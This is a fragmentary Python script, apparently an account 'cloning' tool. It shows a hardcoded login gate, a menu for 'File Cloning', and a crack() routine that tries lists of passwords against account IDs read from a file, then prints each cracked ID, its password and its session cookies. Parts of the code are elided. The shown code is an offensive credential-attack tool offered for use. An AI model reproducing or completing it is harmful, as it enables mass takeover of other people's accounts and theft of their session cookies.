...
while attemps < 12345677901:
    ...
    if username == 'babe' and password == 'babe':
        print(' \033[0;92mSuccessfully login vayo .')
        break
    else:
        print(' PASS WORNG VO ')
        attemps += 1
...
def login():
	banner()
	ICONICj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	ICONICj('\033[0;97m===============================================')
	ICONIC= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if ICONIC in ['m']:
		public()
	elif ICONIC in ['1']:
		crack_file()
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/ICONIC.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[ICONIC] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#ICONIC-King
				print(f'\r\033[0;92m[ICONIC-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " ICONIC,  Ok,  id"')
